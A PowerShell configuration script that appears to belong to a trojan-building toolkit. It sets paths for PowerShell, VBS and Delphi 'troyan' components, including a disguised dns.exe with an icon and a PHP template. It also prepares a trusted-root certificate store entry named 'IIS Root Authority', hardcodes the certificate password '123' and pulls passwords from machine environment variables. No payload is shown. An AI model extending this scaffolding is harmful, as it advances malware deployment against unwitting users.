param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "current.ps1 -serverName argument is null"
}
$psVer = $PSVersionTable.PSVersion.Major
Write-Host "PowerShell v: $psVer"

$serverPath = Resolve-Path -Path (Join-Path -Path "C:\data\$serverName" -ChildPath "server.json")
$server = Get-Content -Path $serverPath -Raw | ConvertFrom-Json
$certPassword = ConvertTo-SecureString -String "123" -Force -AsPlainText
$friendlyName="IIS Root Authority"
$certLocation="cert:\LocalMachine\Root"
if ([string]::IsNullOrEmpty($server.password) -or $server.password -eq "password") {
    $hh = $server.server
    $server.password= [System.Environment]::GetEnvironmentVariable("SuperPassword_$hh", [System.EnvironmentVariableTarget]::Machine)
    if ([string]::IsNullOrEmpty($server.password) -or $server.password -eq "password") {
        $server.password = [System.Environment]::GetEnvironmentVariable('SuperPassword', [System.EnvironmentVariableTarget]::Machine)
    }
}

$rootDir = Split-Path -Path (Split-Path -Path $MyInvocation.MyCommand.Definition -Parent) -Parent


$server.rootDir = $rootDir
$server.cpDir =  (Join-Path -Path $rootDir -ChildPath "cp")
$server.certDir = (Join-Path -Path $rootDir -ChildPath "cert")
$server.sysDir = (Join-Path -Path $rootDir -ChildPath "sys")
$server.adsDir = (Join-Path -Path $rootDir -ChildPath "ads")
$server.phpDir = (Join-Path -Path $rootDir -ChildPath "php")
$server.troyanDir = (Join-Path -Path $rootDir -ChildPath "troyan")

$server.troyanScript = (Join-Path -Path $server.troyanDir -ChildPath "_output\troyan.ps1")
$server.troyanScriptDir = (Join-Path -Path $server.troyanDir -ChildPath "troyanps")
$server.troyanDelphiDir= (Join-Path -Path $server.troyanDir -ChildPath "troyandelphi")
$server.troyanVbsDir = (Join-Path -Path $server.troyanDir -ChildPath "troyanvbs")
$server.troyanVbsFile =(Join-Path -Path $server.troyanVbsDir -ChildPath "troyan.vbs")
$server.troyanLiteVbsFile = (Join-Path -Path $server.troyanVbsDir -ChildPath "litetroyan.vbs")
$server.troyanDelphiExe= (Join-Path -Path $server.troyanDelphiDir -ChildPath "dns.exe")
$server.troyanDelphiProj = (Join-Path -Path $server.troyanDelphiDir -ChildPath "dns.dpr")
$server.troyanDelphiIco = (Join-Path -Path $server.troyanDelphiDir -ChildPath "_icon.ico")
$server.phpTemplateFile = (Join-Path -Path $server.phpDir -ChildPath "dn.php")


function pfxFile {
    param (
        [string]$domain
    )
    return (Join-Path -Path $server.certDir -ChildPath "$domain.pfx")
}

function certFile {
    param (
        [string]$domain
    )
    return (Join-Path -Path $server.certDir -ChildPath "$domain.cer")
}